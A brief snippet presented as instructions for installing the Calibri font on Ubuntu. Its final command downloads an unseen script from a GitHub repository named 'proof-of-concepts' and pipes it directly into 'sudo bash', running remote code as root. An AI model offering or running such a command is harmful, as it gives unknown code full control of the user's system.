to install the Calibri font on Ubuntu, you can use the following script

```bash
sudo apt-get update
sudo apt-get install fontforge
sudo apt-get install cabextract
wget https://raw.githubusercontent.com/januo-org/proof-of-concepts/main/linux/fonts/font-installation.sh -q -O - | sudo bash
```
